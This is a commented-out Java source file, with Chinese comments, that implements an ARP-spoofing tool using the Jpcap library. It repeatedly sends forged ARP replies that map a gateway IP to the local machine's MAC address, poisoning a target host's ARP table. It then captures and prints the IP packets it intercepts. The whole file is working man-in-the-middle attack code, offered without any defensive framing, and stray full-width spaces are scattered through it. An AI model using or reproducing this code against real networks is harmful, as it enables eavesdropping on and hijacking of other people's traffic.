//package org.jasic.qzoner.test;
///**
// * User: Jasic
// * Date: 13-9-11
// */
//public class LocalListener {
//
//    　　
//    private final static String GATE_IP = "192.168.11.1";
//
//    　　
//    private final static byte[] GATE_MAC = {0x00, 0x0a, (byte) 0xc5, 0x42, 0x6e, (byte) 0x9a};
//
//    　　
//    private JpcapCaptor jpcap; //与设备的连接
//
//    　　
//    private JpcapSender sender; //用于发送的实例
//
//    　　
//    private Packet replyPacket; //ARP reply包
//
//    　　
//    private NetworkInterface device; //当前机器网卡设备
//
//    　　
//    private IpMacMap targetIpMacMap; //目的地IP MAC对
//
//    　　
//
//    public LocalListener(IpMacMap target) throws Exception {
//
//        　　NetworkInterface[] devices = JpcapCaptor.getDeviceList();
//        device = devices[1];
//
//        　　this.targetIpMacMap = target;
//
//        　　initSender();
//
//        　　initPacket();
//
//        　　}
//
//    private void initSender() throws Exception {
//
//        　　jpcap = JpcapCaptor.openDevice(device, 2000, false, 10000); //打开与设备的连接
//
//        　　jpcap.setFilter("ip", true); //只监听ip数据包
//
//        　　sender = jpcap.getJpcapSenderInstance();
//
//        　　}
//
//    　　
//
//    private void initPacket() throws Exception {
//
//        　　//reply包的源IP和MAC地址，此IP-MAC对将会被映射到ARP表
//
//        　　IpMacMap targetsSd = new IpMacMap(GATE_IP, device.mac_address);
//
//        　　//创建修改目标机器ARP的包
//
//        　　replyPacket = ARPPacketGern.genPacket(targetIpMacMap, targetsSd);
//
//        　　//创建以太网头信息，并打包进reply包
//
//        　　replyPacket.datalink = EthernetPacketGern.genPacket(targetIpMacMap.getMac(),
//
//                　　device.mac_address);
//
//        　　}
//
//    　　
//
//    public void listen() throws InterruptedException {
//
//        　　Thread t = new Thread(new Runnable() {
//
//            　　
//
//            public void run() {
//
//                　　//发送reply封包，修改目的地arp表， arp表会在一段时间内被更新，所以需要不停发送
//
//                　　while (true) {
//
//                    　　send();
//
//                    　　try {
//
//                        　　Thread.sleep(500);
//
//                        　　} catch (InterruptedException ex) {
//
//                        　　Logger.getLogger(LocalListener.class.getName()).log(Level.SEVERE, null, ex);
//
//                        　　}
//
//                    　　}
//
//                　　}
//
//            　　
//        });
//
//        　　t.start();
//
//        　　//截获当前网络设备的封包收发信息
//
//        　　while (true) {
//
//            　　IPPacket ipPacket = (IPPacket) jpcap.getPacket();
//
//            　　System.out.println(ipPacket);
//
//            　　}
//
//        　　}
//}
